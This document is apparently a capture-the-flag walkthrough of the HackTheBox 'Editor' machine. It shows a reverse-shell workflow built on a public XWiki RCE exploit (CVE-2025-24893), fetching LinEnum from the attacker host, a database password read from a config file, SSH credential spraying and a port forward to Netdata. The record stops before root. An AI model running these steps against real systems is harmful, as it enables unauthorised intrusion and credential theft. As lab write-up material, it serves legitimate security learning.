```
nmap -sS -sC -sV -T5 -Pn 10.10.11.80
```
<img width="1022" height="829" alt="image" src="https://github.com/user-attachments/assets/48131f57-1f28-4a12-9be1-0ba7493fa205" />

```
http://10.10.11.80:8080/xwiki/bin/view/Main/
```
<img width="917" height="861" alt="image" src="https://github.com/user-attachments/assets/b3359115-c8ee-4063-be3a-2a89cacaaf63" />

```
nano /etc/hosts
http://editor.htb/
```
<img width="572" height="290" alt="image" src="https://github.com/user-attachments/assets/e85fedd7-5487-4b5a-be05-1b8c84f40dc3" />

<img width="948" height="558" alt="image" src="https://github.com/user-attachments/assets/aa269196-4ab2-49d1-911e-79dea798f60f" />

```
nano /etc/hosts
http://wiki.editor.htb/xwiki/bin/view/Main/
XWiki Debian 15.10.8 
```
<img width="575" height="225" alt="image" src="https://github.com/user-attachments/assets/13e8e74d-702b-4c15-9c57-90035fa1bf9c" />




```
https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC
```
<img width="669" height="276" alt="image" src="https://github.com/user-attachments/assets/85ac1610-2a52-49ef-8589-e60545821b28" />

```
git clone https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC.git
nc -lvnp 1337
python CVE-2025-24893-dbs.py
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<img width="527" height="359" alt="image" src="https://github.com/user-attachments/assets/8217f726-a9d1-4c40-9559-c9deab64077d" />

<img width="832" height="653" alt="image" src="https://github.com/user-attachments/assets/c5cbff22-63b6-4962-81e4-e7d1766c08a7" />

```
find / -perm -4000 2>/dev/null
```
<img width="694" height="490" alt="image" src="https://github.com/user-attachments/assets/b33c6f2f-24b7-4268-b7a5-58e9ab9de5ee" />

```
python3 -m http.server 80
wget 10.10.14.45/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
<img width="831" height="871" alt="image" src="https://github.com/user-attachments/assets/937734d7-5b3b-402c-96de-fc7ff66f4a38" />

```
cat /etc/xwiki/hibernate.cfg.xml
oliver
theEd1t0rTeam99
```
<img width="1107" height="927" alt="image" src="https://github.com/user-attachments/assets/9267fab8-1673-4997-95d6-25a5e344afa3" />

```
crackmapexec ssh 10.10.11.80 -u users.txt -p pass.txt
```
<img width="1052" height="385" alt="image" src="https://github.com/user-attachments/assets/cbed6184-2926-4648-b1ff-aefcb76ed132" />


```
ssh oliver@10.10.11.80
```
<img width="1202" height="909" alt="image" src="https://github.com/user-attachments/assets/8b1d95d4-d13a-4c2f-b8ba-85546c28b3e7" />

```
python3 -m http.server 80
wget 10.10.14.45/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
<img width="1098" height="1125" alt="image" src="https://github.com/user-attachments/assets/9ee1a4bc-2e35-4dda-818d-fdaa4c16f765" />

```
netdata
```
<img width="1072" height="352" alt="image" src="https://github.com/user-attachments/assets/cf3b3bf7-acf0-4b6d-8d5d-1d5b0c837d52" />

<img width="420" height="451" alt="image" src="https://github.com/user-attachments/assets/a2891942-185e-474f-bc45-954aa51d664a" />

<img width="530" height="522" alt="image" src="https://github.com/user-attachments/assets/6d0bf7ea-9ac1-4d10-9e35-fee6852262e1" />

<img width="843" height="857" alt="image" src="https://github.com/user-attachments/assets/d26bd701-1002-4d9f-bbf4-dad99434f7d5" />

```
ssh oliver@10.10.11.80 -L 19999:localhost:19999
localhost:19999
Netdata 1.45.2
```
<img width="981" height="549" alt="image" src="https://github.com/user-attachments/assets/0f601f14-0174-4820-b5a6-33ad8bae643b" />

```

```
